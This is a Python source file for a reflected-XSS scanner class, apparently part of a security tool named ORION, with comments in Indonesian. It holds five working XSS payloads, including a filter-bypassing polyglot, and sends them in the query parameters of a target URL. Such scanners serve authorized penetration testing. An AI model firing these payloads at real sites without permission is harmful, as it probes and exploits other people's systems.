import requests
import urllib.parse
from colorama import Fore

class FrontendScanner:
    def __init__(self, logger):
        self.logger = logger
        self.headers = {
            'User-Agent': 'Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/91.0.4472.124 Safari/537.36'
        }
        
        # [SOURCE: PayloadsAllTheThings - XSS Polyglots]
        # Menggunakan Top 5 payload paling efektif untuk efisiensi scan
        self.xss_payloads = [
            # Standard Test
            "<script>alert('ORION_XSS')</script>",
            # Polyglot umum (menembus filter atribut/script)
            "javascript://%250Aalert('ORION_1')//",
            # Image Error Vector
            "<img src=x onerror=alert('ORION_IMG')>",
            # SVG Vector (Bypass umum)
            "<svg/onload=alert('ORION_SVG')>",
            # Ultimate Polyglot by 0xSobky (Sangat powerful)
            "jaVasCript:/*-/*`/*\`/*'/*\"/**/(/* */oNcliCk=alert('ORION_POLY') )//%0D%0A%0d%0a//</stYle/</titLe/</teXtarEa/</scRipt/--!>\x3csVg/<sVg/oNloAd=alert('ORION_POLY')//>\x3e"
        ]

    def scan_xss(self, target_url):
        findings = []
        parsed = urllib.parse.urlparse(target_url)
        params = urllib.parse.parse_qs(parsed.query)

        if not params:
            return ["[INFO] Frontend Scan Skipped: No parameters found."]

        print(f"{Fore.CYAN}    [>] Loading {len(self.xss_payloads)} Pro-Payloads from PayloadsAllTheThings...{Fore.RESET}")

        for param_name in params:
            for i, payload in enumerate(self.xss_payloads):
                # Copy parameter
                temp_params = params.copy()
                temp_params[param_name] = payload
                
                # Build URL
                new_query = urllib.parse.urlencode(temp_params, doseq=True)
                test_url = parsed._replace(query=new_query).geturl()

                try:
                    # Kirim Request
                    res = requests.get(test_url, headers=self.headers, timeout=5)
                    
                    # Logika Deteksi:
                    # Kita cari string unik payload kita di dalam source code response.
                    # Jika payload (misal 'ORION_SVG') muncul utuh, kemungkinan besar XSS.
                    check_string = "ORION_"
                    
                    if check_string in res.text and payload in res.text:
                        findings.append(f"[VULN] Reflected XSS Found on param '{param_name}'")
                        findings.append(f"       Vector: {payload[:50]}...")
                        # Jika sudah ketemu 1, hentikan loop payload untuk parameter ini (biar cepat)
                        break 
                        
                except requests.exceptions.Timeout:
                    findings.append(f"[WARN] Timeout pada payload {i+1}. Target mungkin lambat.")
                except Exception as e:
                    pass # Ignore error koneksi kecil

        if not findings:
            findings.append("[SAFE] Frontend terlihat aman dari Basic Reflected XSS.")
            
        return findings